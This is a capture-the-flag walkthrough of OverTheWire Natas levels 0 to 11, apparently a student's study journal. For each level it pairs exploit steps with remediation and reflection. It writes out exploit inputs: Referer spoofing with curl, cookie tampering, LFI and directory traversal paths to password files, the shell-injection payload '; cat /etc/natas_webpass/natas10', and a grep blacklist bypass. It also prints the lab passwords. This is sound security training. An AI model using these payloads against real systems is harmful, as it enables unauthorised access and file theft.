Natas Tool Repository: https://github.com/ScottyPoon/nata-probe
## Level 0
**Vulnerability**: Information Disclosure (in HTML Source).
**Thought Process**: The page states "You can find the password for the next level on this page." so I assumed the password must be visible somewhere on the page or in the source.
**Methodology & Execution**
- **Tools Used:** Web Browser (View Source functionality):
- **Step-by-Step Execution:**
	1. Right clicked on page and clicked on "Inspect"
	2. Scanned the HTML source and found the password as a HTML comment `<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->`.

**Vulnerability & Real-World Impact**
- **Root Cause:** Developers leaving sensitive information like credentials, internal comments or API keys in client-side code, assuming users won't look.
- **Real-World Scenario:** A developer leaves an AWS access key in a JavaScript file on a staging server. The file is accidentally pushed to production, exposing the key to the public and allowing for cloud infrastructure compromise.
- **Risk:** Low in this context, but critical in the real world in the data exposed is sensitive like API keys or credentials.

**Remediate & Security Engineering Principles**
- **Remediation**: Implement automated tooling like pre-commit hooks or CI/CD pipeline scanners to detect and prevent secrets from being committed to the codebase.
- **Principle Illustrated:** Principle of Least Privilege. The client (browser) doesn't need to know the password, so it should never be sent.

**Personal Reflection & Growth**
- **What I Found Challenging:** Nothing, the challenge was straightforward.
- **Connecting to Future Challenges:** Reinforces that I should always view source first.
- **Growth:** Reinforces that a simple oversight can lead to a compromise and to never skip the basics.

---

## Level 0 → Level 1
**Vulnerability**: Security through Obscurity.
**Thought Process**: The page states "You can find the password for the next level on this page, but rightclicking has been blocked!" so I assumed they used JavaScript to disable right clicking since I've seen this in some websites to prevent copying text.
**Methodology & Execution**
- **Tools Used:** Browser Developer Tools
- **Step-by-Step Execution:**
	1. Attempted to right-click on the page, a prompt saying "right clicking has been blocked!" confirmed it was disabled.
	2. Pressed F12 to open up the Developer Tools to bypass the client-side script and view the source.
	3. Scanned for the password within a HTML comment, similar to Natas0: `<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->`

**Vulnerability & Real-World Impact**
- **Root Cause:** Relying on client-side controls (JavaScript) for security. 
- **Real-World Scenario:** A premium stock photo site like Shutterstock trying to prevent users from saving images by disabling right-click. However, a user can press F12 to open Developer tools, inspect the page's HTML and locate the `<img>` tag, and open the image URL in a new tab to save it.
- **Risk:** Low, it's a usability control, not a security control. It creates a false sense of protection if mistaken for security.

**Remediate & Security Engineering Principles**
- **Remediation**: Client-side content is inherently public. If data needs to be protected, it should never be sent to the client without proper sever-side access control.
- **Principle Illustrated:** Secure by Design. A system should be designed with the understanding that client-side security controls are ineffective.

**Personal Reflection & Growth**
- **What I Found Challenging:** Nothing, the challenge was straightforward.
- **Connecting to Future Challenges:** Reinforced that I should always check if a restriction is client-side.
- **Growth:** Now I instinctively question where security is enforced, if it's client-side I assume it can be bypassed.

---

## Level 1 → Level 2
**Vulnerability**: Information Disclosure & Improper Access Control
**Thought Process**: The page states "There is nothing on this page ", the source code reveals the div contains an image: `<img src="files/pixel.png">`. I opened the image in a new tab to check its direct URL and source. I couldn't find anything in the source, so my instinct was to look at the `/files/` directory to see if it contained anything interesting.
**Methodology & Execution**
- **Tools Used:** Browser
- **Step-by-Step Execution:**
	1. Right-clicked the 1x1 pixel image and opened it in a new tab.
	2. Scanned the source for a password, which wasn't there.
	3. Observed the URL in the browsers address bar: `http://natas2.natas.labs.overthewire.org/files/pixel.png`.
	4. Recognised the `/files/` directory in the path as a point of interest.
	5. Removed `pixel.png` from the URL and navigated to `http://natas2.natas.labs.overthewire.org/files/`.
	6. Observed the returned index page listing the contents of the directory that contained a file named `users.txt`.
	7. Clicking on `user.txt` reveals the username and password: `natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`.

**Vulnerability & Real-World Impact** https://portswigger.net/kb/issues/00600100_directory-listing
- **Root Cause:** The web server was misconfigured with directory listing enabled, revealing the existence of the sensitive `users.txt` file. Additionally, the file itself lacked any access restrictions, allowing it to be read by any users who knew its path.
- **Real-World Scenario:** A developer uploads a `db_backup.sql.gz` to a `/temp/` directory.
	- The directory listing flaw allows a scanning tool to automatically find the `/temp/` directory and see the backup filename.
	- The improper access control allows an attacker to download that file.
- **Risk:** High, the combination of these two misconfigurations leads to sensitive data being exposed. In this case it's user credentials, which would lead to system compromise or legal liability for the organisation.

**Remediate & Security Engineering Principles**
- **Remediation**: Disable directory listing globally in the web server configuration file and never store sensitive files within the web root. Sensitive files should be stored outside the web root, they should be moved to a private directory so only the server can read them.
- **Principle Illustrated:** 
	- **Defence in Depth**: Applying both fixes creates a layered defence. If a developer mistakenly places a sensitive file in the web root, the disabled directory listing still prevents its easy discovery.
	- **Principle of Least Privilege**: Ensures only authorised users or internal services can access sensitive files.

**Personal Reflection & Growth**
- **What I Found Challenging:** Nothing, the challenge was straightforward.
- **Connecting to Future Challenges:** This level trained me to probe the directory structure revealed by static asset paths. 
- **Growth:** I gained a better appreciation for the security impact of server configuration settings. Security isn't only about code but also about the environment it runs in.


---

## Level 2 → Level 3
**Vulnerability**: Information Disclosure via Misconfigured `robots.txt`
**Thought Process**: The page states "There is nothing on this page", the source reveals the comment `<!-- No more information leaks!! Not even Google will find it this time... -->`. I didn't think much of the comment and assumed it was a generic message and didn't connect it to anything actionable. 
**Methodology & Execution**
- **Tools Used:** Browser
- **Step-by-Step Execution:**
	1. After deducing the hint's meaning, I navigated to the location of the `robots.txt` file `http://natas3.natas.labs.overthewire.org/robots.txt`. Revealing the disallowed directory: `Disallow: /s3cr3t/`.
	2. I navigated to the disallowed directory `http://natas3.natas.labs.overthewire.org/s3cr3t/`, it contained `users.txt` file revealing the password: `natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** I spent 30 minutes trying to brute-force common directory names like `/admin/`, `/test/`, `/files`, etc.
- **Why it Failed:** It was an unguided and inefficient approach based on guesswork because I hadn't yet stopped to properly analyse the explicit hint provided on the page.
- **Overcoming Adversity**: After failing to find anything I decided to take the hint literally and investigate the "Google" reference. I searched for "how does Google work". This led me to Google's developer documentation (`https://developers.google.com/search/docs/fundamentals/how-search-works`), which detailed the role of web crawlers and the `robots.txt` file as a standard for telling them what to ignore.
- **What I Learned:** For CTFs, play close attention to hints as they're designed to guide you towards a specific vulnerability. Also, in real-world pen tests, `robots.txt` is a primary file to check during initial reconnaissance. 
**Vulnerability & Real-World Impact**
- **Root Cause:** Misunderstanding the purpose of `robots.txt`. Its purpose is to manage crawler traffic for SEO purposes, not to enforce access control. Any path listed in it is public for attackers to identify hidden paths of a site.
- **Real-World Scenario:** An organisation places its administration login portal at `/admin-portal/` and adds `Disallow: /admin-portal/` to `robots.txt` to keep it out of search results. An attacker performing reconnaissance finds this entry, discovers the login page and start to brute-force or use credential stuffing attacks.
- **Risk:** Low to medium, the file doesn't grant access, but provides attackers with a roadmap of potentially sensitive endpoints that aren't found on the main site which aids them in reconnaissance.

**Remediate & Security Engineering Principles**
- **Remediation**: The `/s3cr3t/` directory shouldn't be in the web root, but if it needs to be there should be proper server-side authentication and authorisation, not by obscurity.
- **Principle Illustrated:** Secure by design, a secure system should be designed with proper access controls. It shouldn't rely on weak mechanism like `robots.txt` to protect sensitive areas.

**Personal Reflection & Growth**
- **What I Found Challenging:** Initially, I didn't recognise the importance of the HTML comment and dismissed it as flavour text rather than a hint which lead me to wasting 30 minutes brute-forcing. 
- **Connecting to Future Challenges:** This level revised my reconnaissance methodology. If a hint or comment mentioned a specific technology or entity like Google, my first step will be to research the standard protocols and configurations associated with it. From now on, standard reconnaissance files like `robots.txt`, `sitemap.xml` or `.DS_Store` are on my checklist for web targets.
- **Growth:** I developed a more mature problem-solving process, moving away from a "work harder" mentality (brute-force) to a "think smarter" one (analysing hints and researching fundamentals). I realised effective security is about deep knowledge of protocols, not just running tools. Also, it cemented the role of `robots.txt` as a reconnaissance tool for attackers.

---

## Level 3 → Level 4
**Vulnerability**: Broken Access Control via HTTP Referrer Spoofing
**Thought Process**: The page states `Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"` with a button to refresh the page. After refreshing, the page states `Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`, this led me to inspect the HTTP response as I thought the server was making an authorisation decision based on a cookie.
**Methodology & Execution**
- **Tools Used:** Browser Developer Tools, `curl`.
- **Step-by-Step Execution:**
	1. A normal request with `curl`, confirming the access disallowed message: `curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/`
	2. Crafted a new `curl` request that includes a spoofed `Referer` header using the `-e` flag, setting it to the required value: 
	`curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -e http://natas5.natas.labs.overthewire.org/ http://natas4.natas.labs.overthewire.org/`
	3. Observed the output which revealed `Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** Initially I was confused, I had experience in manipulating data send to APIs, like editing a JSON request body. I instinctively looked for parameters in the URL or a form to manipulate and found nothing and didn't know response headers could be manipulated.

- **Why it Failed:** My understanding of the attack surface was too limited. I was focused only on obvious input fields and overlooked the less visible, yet equally exploitable, components of the HTTP request. 

- **Overcoming Adversity**: I thought to observe the response and request headers before and after refreshing. Using the browser's developer tools I observed the first request had no `Referer` header, whereas the second had `Referer: http://natas4.natas.labs.overthewire.org/`, this made me theorise the hint was looking for the `Referer` to be from `http://natas5.natas.labs.overthewire.org/`.

- **What I Learned:** A HTTP request is a collection of user-controllable data, not just a URL and a body. Headers are often a poorly secured attacked that should be treated with the same critical attention as any other user-controlled input.


**Vulnerability & Real-World Impact**
- **Root Cause:** Broken Access Control. The application makes a critical authorisation decision by trusting the `Referer` header, which is entirely control by the client. This is a fundamental failure to validate access based on a trusted, server-side state.
- **Real-World Scenario:** A corporate web application provides access to internal admin functions only to users on the internal network. It enforces this by checking for a private IP range in the `X-Forwarded-For` header. An external attacker can spoof this header to bypass the check and gain access to an admin panel.
- **Risk:** Medium to high, its a complete authorisation bypass. The impact is medium if it protects a minor feature, but becomes critical if it protects something like an admin pane or, sensitive user data.

**Remediate & Security Engineering Principles**
- **Remediation**: Implement stateful, server-side authorisation instead of relying on client-controlled headers. For example, after a successful login, store a trusted session flag on the server like `req.session.isAuthorised = true`. Any access to protected routes should then check this session variable to verify permissions, completely ignoring any data sent by the client in headers.
- **Principle Illustrated:** Never Trust User Input. This highlights user input includes every byte of the request that the client can influence such as HTTP headers.

**Personal Reflection & Growth**
- **What I Found Challenging:** This was the first time I encountered header-based access controls excluding cookies and didn't know request headers could be manipulated.
- **Connecting to Future Challenges:** I'll now question if the access is controlled by a header and active probe `User-Agent`, `X-Forwarded-For`, and other standard of custom headers as part of my initial reconnaissance.
- **Growth:** This challenge shifted my understanding of web vulnerabilities from being purely about visible inputs like forms or URL to the entire HTTP request protocol. I've learned to see the whole request as an attack surface.


---

## Level 4 → Level 5
**Vulnerability**: Broken Authentication (Weak Session Management)
**Thought Process**: The page states "Access disallowed. You are not logged in", my immediate reaction was to ask, "How do I log in?", I started looking for a login form, either visible on the page, commented out in the HTML source, a common endpoint like `/login` or `/admin` and the HTTP response. 
**Methodology & Execution**
- **Tools Used:** Browser Developer Tools (Application/Storage tab)
- **Step-by-Step Execution:**
	1. Opened Developer Tools and observed the HTTP response and observed Cookie header.
	2. Navigated to the Cookies section with cookie named `loggedin` with value `0`, which meant false.
	3. Changed the cookie value from `0` to `1`.
	4. Refreshed the page, which displayed `Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned`

**Vulnerability & Real-World Impact**
- **Root Cause:** The application uses a simple, non-validated Boolean on the client-side to manage authentication state. The server blindly trusts the value of the `loggedin` cookie without any server-side validation or cryptographic signature.
- **Real-World Scenario:** A web application determines if a user is an admin by checking for a cookie `isAdmin=false`. An attacker simply modifies this value to true to gain full admin privileges. 
- **Risk:** High, it allows for trivial privilege escalation and authentication bypass.

**Remediate & Security Engineering Principles**
- **Remediation**: Implement proper server-side session management. 
	1. Server generates a random, unpredictable session ID.
	2. Server stores it (DB/cache) with user data (ID, privileges).
	3. Client receives it as a `Secure, HTTPOnly` cookie.
	4. Server validates each request by checking the session ID. 

This means the client can't forge the cookie as the server controls the auth state.
- **Principle Illustrated:** Secure by Design. Authentication state must always be managed and verified server-side. The client should only hold an unguessable identifier (session ID), not the state itself. 

**Personal Reflection & Growth**
- **What I Found Challenging:** Nothing, the challenge was straightforward, with some trial and error.
- **Connecting to Future Challenges:** I'll make cookie analysis a mandatory step.
- **Growth:** It illustrated and reinforced why client-side state is untrustworthy and how server-managed sessions are the industry standard of web authentication.

---

## Level 5 → Level 6

**Vulnerability**: Improper Asset Management
**Thought Process**: The page contains form to submit a secret and its source code. Seeing the PHP code for the first time I thought it had some similarities to C++/JavaScript syntax and the conditional logic `if($secret == $_POST['secret'])` caught my attention. I hypothesised there was some logical flaw within its comparison that I could bypass without need to know the actual value of `$secret`.

**Methodology & Execution**
- **Tools Used:** Browser
- **Step-by-Step Execution:**
	1.  Analysed the PHP source code snippet
		```php
		<?  
		  
		include "includes/secret.inc";  
		  
		    if(array_key_exists("submit", $_POST)) {  
		        if($secret == $_POST['secret']) {  
		        print "Access granted. The password for natas7 is <censored>";  
		    } else {  
		        print "Wrong secret";  
		    }  
		    }  
		?>
		```
	2. Identified the critical line in the code: `include "includes/secret.inc";`. This revealed a file path.
	3. Navigate to `http://natas6.natas.labs.overthewire.org/includes/secret.inc` and analyse its contents. 
	```php
		<?
		$secret = "FOEIUWGHFEEUHOFUOIU"; 
		?>
	```
	4. Submitted this value to the form to reveal Natas7 password `bmg8SvU1LizuWjx3y7xkNERkHxGre0GS`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** My first attempt was based on a misunderstanding of PHP syntax. I thought the line `if($secret == $_POST['secret'])` meant the password was the word "secret" and didn't recognise the `$` as a variable indicator.

- **Why it Failed:** `$secret` is a variable that holds the secret value, not a literal string. The code was actually comparing the input in the form to the true value of the `$secret` variable which was contained in another file.

- **Overcoming Adversity**: When my guess failed, I realised I couldn't just deduce the logic and had to understand the language. I took a step back from trying to exploit the code and focused on understanding it. A quick search for "PHP syntax" revealed that any word prefixed with `$` is a variable which made me realise I just needed to find it's value, but I couldn't find in the code where it was stored. Upon further analysis I saw the `include` line which reminded me of how `#include` directive works in C++.

- **What I Learned:** Apart from learning some basic PHP syntax I also learned that you can't effectively analyse code for vulnerabilities without a basic understanding of its syntax. It taught me the importance of a "reconnaissance first" mindset. Instead of immediately trying to break something I needed to first take the time to understand how it works to prevent wasted time on flawed assumptions.


**Vulnerability & Real-World Impact**
- **Root Cause:** The critical flaw is storing a sensitive file (`secret.inc`) within the web root, making it directly accessible via a URL. The web server is not configured to execute `.inc` files as PHP, so it defaults to serving them as plain text, disclosing their contents.
- **Real-World Scenario:** A developer writes a `db_config.php` file containing database credentials. They `include` it in their application. A server misconfiguration or a backup process leaves a copy `db_config.php.bak` in the same directory where an attacker can browse directly when the server renders it as text. The db username and password are exposed leading to a full db compromise.
- **Risk:** High, this vulnerability directly exposes the secrets required for the next stage of access, in the real world it could be API keys, db credentials or other critical tokens that may lead to a major data breach.

**Remediate & Security Engineering Principles**
- **Remediation**: The architectural solution is to store sensitive configuration files outside of web root. For example, `secret.inc` could be moved to a directory like `/var/www/natas_config/secret.inc` and the PHP app could still access it via the server's filesystem with `include '/var/www/natas_config/secret.inc'`.
- **Principle Illustrated:** Principle of Least Privilege / Defence in Depth, the web server process shouldn't have the privilege to server configuration files as a static assets. Placing them outside the web root architecturally enforces this separation and provides a layer of defence even if the server configuration file for file handling is weak.

**Personal Reflection & Growth**
- **What I Found Challenging:** The main challenge was the lack of language-specific knowledge.
- **Connecting to Future Challenges:** If I see lines like `include` or `require` or read-file operations in the source code it'll immediately become a point of interest and my first step will be to test if the specified file path is accessible from the browser.
- **Growth:** It internalised that taking the time thoroughly understand a language's syntax is an essential part of analysis. 
---

## Level 6 → Level 7
**Vulnerability**: Local File Inclusion (LFI) / Directory Traversal
**Thought Process**: The page dynamically changes content ("Home" vs. "About") when clicking links and the source code comment revealed a direct file path `/etc/natas_webpass/natas8`. My first thought was to find a form or input field to submit this path and was confused by the lack of any obvious user input interface. 
**Methodology & Execution**
- **Tools Used:** Browser
- **Step-by-Step Execution:**
	1. Observed the source code, taking note of the hint.
		```HTML
		<div id="content">
			<a href="index.php?page=home">Home</a>
			<a href="index.php?page=about">About</a>
			<br>
			<br>
			this is the home page
			<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
		</div>
		```
	2. Observed the URL structure for the "Home" link: `http://natas7.natas.labs.overthewire.org/index.php?page=home`.
	3. Observed the URL structure for the "About" link: `http://natas7.natas.labs.overthewire.org/index.php?page=about`.
	4. Identified the pattern, the `page` parameter's value is used to determine which content to display.
	5. Constructed the payload by replacing the expected value (`home` or `about`) with the file path from the hint.
	6. Navigate to the crafted URL `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`, revealing the password `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** Initially, I searched the page for an upload form or a text box that might be hidden so I could submit the file path.

- **Why it Failed:** I misunderstood the attack surface, the vulnerability wasn't in a form submission, but rather in the page-switching logic which was exposed in the URL.

- **Overcoming Adversity**: Realising the URL parameter itself was the input vector. The application was trusting the `page` parameter to build a file path on the server which is an LFI pattern.

- **What I Learned:** This taught me that user-controllable input isn't limited to forms and URL parameters can also be potent attacker vectors.


**Vulnerability & Real-World Impact**
- **Root Cause:** Unsanitised user input being passed directly to a file inclusion function like `include()` in PHP. 
- **Real-World Scenario:** A hospital uses a web application to load different pages (e.g., `?page=visiting_hours`, `?page=contact_info`). An attacker could exploit an LFI vulnerability to access sensitive server files, such as `?page=../../../../etc/passwd` to enumerate system users, or configuration files containing database credentials, which might lead to breach of patient records.
- **Risk:** High, LFI allows an attacker to read arbitrary sensitive files on the server which can leak source code, credentials and system information which are critical steps in escalating an attack to a full system compromise.

**Remediate & Security Engineering Principles**
- **Remediation**: Use a whitelist-based approach and maintain an explicit list of allowed pages. Before including a file, verify that the value from the `page` parameter is present in the allowed list or else reject the request. 
```PHP
$allowed_pages = ['home', 'about'];
if (in_array($_GET['page'], $allowed_pages)) {
    include($_GET['page'] . '.php');
} else {
    echo "Invalid page.";
}
```
- **Principle Illustrated:** Principle of Least Privilege / Secure Defaults, the application should only be able to include files from a pre-approved set and all other inputs should be rejected, this also means that access is limited to only what is necessary.

**Personal Reflection & Growth**
- **What I Found Challenging:** Initially I struggled with spotting vulnerabilities in areas that lack explicit user input fields, like navigation elements controlled by URL parameters.  
- **Connecting to Future Challenges:** It sharpened my awareness to look beyond obvious input points during reconnaissance and how inputs like URLs, headers or cookies might impact file operations and access control.
- **Growth:** I developed a deeper understanding of how unsanitised input can lead to serious vulnerabilities like LFI and directory traversal and the importance of secure coding practices like input validation and whitelisting. This will help me write safer code and perform more thorough security analyses in future projects.
---

## Level 7 → Level 8
**Vulnerability**: Security Through Obscurity
**Thought Process**: The page contains form to submit a secret and its source code. The solution was clear in the PHP code, the check for correctness was `if(encodeSecret($_POST['secret']) == $encodedSecret)` and the function `encodeSecret()` processed the input. I knew I had to reverse the `encodeSecret()` function to find the original plaintext that would produce the hardcoded `$encodedSecret` value.
**Methodology & Execution**
- **Tools Used:** Browser, PHP Online Sandbox
- **Step-by-Step Execution:**
	```PHP
	<?  
	$encodedSecret = "3d3d516343746d4d6d6c315669563362";  
	  
	function encodeSecret($secret) {  
	    return bin2hex(strrev(base64_encode($secret)));  
	}  
	  
	if(array_key_exists("submit", $_POST)) {  
	    if(encodeSecret($_POST['secret']) == $encodedSecret) {  
	    print "Access granted. The password for natas9 is <censored>";  
	    } else {  
	    print "Wrong secret";  
	    }  
	}  
	?>
	```
	1. Analysed the encoding function: `return bin2hex(strrev(base64_encode($secret)));`.
	2. Deconstructed the chain of operations from inside out:
		1. `base64_encode()`
		2. `strrev()` (string reverse)
		3. `bin2hex()` (binary to hexadecimal)
	3. Wrote a simple PHP script to perform the inverse operations on the given `$encodedSecret`:
		```PHP
		<?php
		$encodedSecret = "3d3d516343746d4d6d6c315669563362";
		// Convert hex string back to binary
		$binaryData = hex2bin($encodedSecret);
		// Reverse the binary string to get the original base64 encoded string
		$reversedBase64 = strrev($binaryData);
		// Decode the base64 string to get the original secret
		$originalSecret = base64_decode($reversedBase64);
		echo $originalSecret;
		?>
		```
	4. Submit the resulting secret, `oubWYf2kBq` to reveal the password for Natas9: `ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** N/A
- **Why it Failed:** N/A
- **Overcoming Adversity**: N/A
- **What I Learned:** It reinforced the importance of source code review and how when the logic is laid bare, a direct analytical approach is better than guessing. Also, more familiarity of PHP syntax due to writing my own script to find the secret. 


**Vulnerability & Real-World Impact**
- **Root Cause:** Security through obscurity. The developer mistakenly believed that a multi-step, non-standard encoding process would provide meaningful security. Since the encoding algorithms are known and its steps are reversible, it provides zero confidentiality. 
- **Real-World Scenario:** A developer "hides" a sensitive API key inside a compiled mobile application. They might chain several encodings such as URL encoding and ROT13 to prevent casual discovery. An attacker can easily decompile the application, identify this reversible "encryption" routine, and write a simple script to extract the API key, gaining unauthorised access to the backend service.
- **Risk:** High, the vulnerability leaks the password and implements a trivially bypassable protection mechanism. It represents a flawed design pattern, creating a false sense of security for the asset it's trying to protect.

**Remediate & Security Engineering Principles**
- **Remediation**: For secret validation, the developer should avoid using custom, reversible encoding functions. Instead they should use a standard, one-way cryptographic hash function like SHA-256 to hash the expected value and then perform a secure comparison against a stored hash. 
- **Principle Illustrated:** Kerckhoffs’s Principle is violated by the challenge. A cryptosystem should be secure even if everything about the system, except the key is public knowledge. Natas8's "system" (the `encodeSecret` function) collapses the moment it becomes known.

**Personal Reflection & Growth**
- **What I Found Challenging:** Conceptually it was straightforward, the personal challenge was translating the logical steps of reversal into PHP so I could be more familiar with the language's syntax.
- **Connecting to Future Challenges:** It reminded me that seemingly complex logic can still be completely insecure if it's reversible and exposed.
- **Growth:** The challenge provided a good example of why "complex" encoding doesn't equal security and reinforced my understanding of security through obscurity.


---

## Level 8 → Level 9
**Vulnerability**: OS Command Injection
**Thought Process**: The page contained a form to submit search terms that get searched inside a dictionary. Seeing the PHP code with `passthru()` directly executing a command with user-controlled input `$key = $_REQUEST["needle"];` immediately signalled an OS command injection vulnerability. I assumed that I could use a common shell separator like `;`to append arbitary commands and read sensitive files. 
**Methodology & Execution**
- **Tools Used:** Browser
- **Step-by-Step Execution:**
	```PHP
	<?
	$key = "";
	
	if(array_key_exists("needle", $_REQUEST)) {
	    $key = $_REQUEST["needle"];
	}
	
	if($key != "") {
	    passthru("grep -i $key dictionary.txt");
	}
	?>
	```
	1. Identified the vulnerable parameter: `needle` passed to the shell command. 
	2. Identified the `passthru("grep -i $key dictionary.txt");` as the command execution point.
	3. Formulated a payload using the semicolon to chain `cat` to read the password file: `; cat /etc/natas_webpass/natas10` which revealed the Natas10 password `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** N/A
- **Why it Failed:** N/A
- **Overcoming Adversity**: N/A
- **What I Learned:** N/A


**Vulnerability & Real-World Impact**
- **Root Cause:** Direct execution of user-supplied input within a shell command via `passthru()`.
- **Real-World Scenario:** A web app lets admins run system commands like ping on user-supplied input. Without proper input validation, attackers can inject commands to take control of the server.
- **Risk:** High, leads to arbitrary code execution on the server, resulting in full system compromise.

**Remediate & Security Engineering Principles**
- **Remediation**: Avoid executing shell commands with user-supplied input entirely. Use built-in language functions (like PHP's `file_get_contents` or `strpos()`) to handle tasks safely and reduce risk.
- **Principle Illustrated:** Principle of Least Privilege, the application shouldn't have the privilege to execute arbitrary shell commands from user input. Input Validation, all user input should be strictly validated and sanitised. 

**Personal Reflection & Growth**
- **What I Found Challenging:** Nothing, the challenge was straightforward.
- **Connecting to Future Challenges:** Served as a good example of command injection and will be looking at how functions execute external commands with user input.
- **Growth:** Solidified how even though command injection is basic it remains a potent thread due to improper coding practices and insufficient input handling. 


---

## Level 9 → Level 10
**Vulnerability**: OS Command Injection (Blacklist Bypass)
**Thought Process**: Same challenge as the previous level, but with added filtering. Looking at the source code the filter was present in `preg_match('/[;|&]/',$key)` which meant direct command chaining in Natas9 would be blocked. I assumed I had to find a way around the blacklist, given `grep` was used I thought I could exploit its command-line argument parsing.
**Methodology & Execution**
- **Tools Used:** Browser
- **Step-by-Step Execution:**
	```PHP
	$key = "";  
	  
	if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];  
	}  
	  
	if($key != "") {  
	    if(preg_match('/[;|&]/',$key)) {  
	        print "Input contains an illegal character!";  
	    } else {        passthru("grep -i $key dictionary.txt");  
	    }  
	}  
	?>
	```
	1. Identified the `needle` parameter and the `passthru("grep -i $key dictionary.txt");` execution.
	2. Noted the blacklist `preg_match('/[;|&]/',$key),` confirming that common shell separators (`|`, `;`, `&`) were filtered.
	3. Understood that the injection had to leverage `grep`'s own functionality, rather than breaking out of the command. `grep` can take multiple file arguments.
	4. Formulated the payload: `.* /etc/natas_webpass/natas11`. `.*` is a regular expression that matches any character (`.`) zero or more times (`*`).
	5. Submit the payload in the form, revealing credentials for the next level: `natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`.

**Rabbit Holes & Overcoming Adversity**
- **Failed Attempt:** N/A
- **Why it Failed:** N/A
- **Overcoming Adversity**: N/A
- **What I Learned:** N/A


**Vulnerability & Real-World Impact**
- **Root Cause:** Insecure input validation via blacklist `preg_match('/[;|&]/',$key)` is easily bypassed and fails to prevent command injection. 
- **Real-World Scenario:** A server-side app processes user-supplied input to search logs or files. Attackers can exploit this to read sensitive files like configs or credentials.
- **Risk:** High, it enables arbitrary file reads, paving the way for data leaks or full system compromise.

**Remediate & Security Engineering Principles**
- **Remediation**: Avoid using `passthru()` or similar functions with user input. Instead, use PHP-native methods like `file_get_contents()` or `strpos()` to safely replicate `grep`, eliminating OS command injection risk. 
- **Principle Illustrated:** Principle of Least Privilege, the application should not have the ability to execute arbitrary system commands based on user input. Positive Security Model, prefer whitelisting over blacklisting. 

**Personal Reflection & Growth**
- **What I Found Challenging:** It was straightforward, I just needed to analyse how to change my previous payload. 
- **Connecting to Future Challenges:** N/A
- **Growth:** Reinforced from week 1 lectures of how weak blacklists can be.
---

## Level 10 → Level 11
**Vulnerability**: Weak Cryptography / Known Plaintext Attack (XOR Cipher)
```PHP
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);

?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>
```
**Thought Process**: The page states "Cookies are protected with XOR encryption," which drew my attention to the `data` cookie and the `xor_encrypt` function in the source code. I then focused on the `$key = '<censored>';`line and the `setcookie("data", base64_encode(xor_encrypt(json_encode($d))));` operation. Also I observed the form allowing submission of a `bgcolor` which defaulted to `#ffffff`. Given the `showpassword` key in the `defaultdata` array ( `"showpassword"=>"no"`), and the condition (`if($data["showpassword"] == "yes")`), I theorised that I could manipulate the cookie's plaintext to `showpassword:yes` if I could derive the XOR key. The `bgcolor` key, being part of the encrypted JSON in `defaultdata`, seemed like a good candidate for a known plaintext component. 

**Methodology & Execution**
- **Tools Used:** Browser Developer Tools, `regex101.com` (for understanding the `bgcolor` regex), `CyberChef` (for Base64 decoding/encoding and XOR operations).
- **Step-by-Step Execution:**
	1. Identified the encryption scheme: The `saveData` function showed `setcookie("data", base64_encode(xor_encrypt(json_encode($d))))`, meaning the cookie value was JSON-encoded, then XOR-encrypted, then Base64-encoded.
	2. Determined known plaintext: The `defaultdata` array `{"showpassword":"no","bgcolor":"#ffffff"}` was the exact plaintext that would be encrypted when the page loads initially with the default background colour from the form.
	3. Observed the data cookie value in the browser: `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GImcJAyIxTRg=` which corresponded to the ciphertext.
	4. Derived the XOR key using CyberChef to `From Base64` the cookie ciphertext, then XOR'd it with the known plaintext `{"showpassword":"no","bgcolor":"#ffffff"}`. This revealed the XOR key to be `eDWo`.
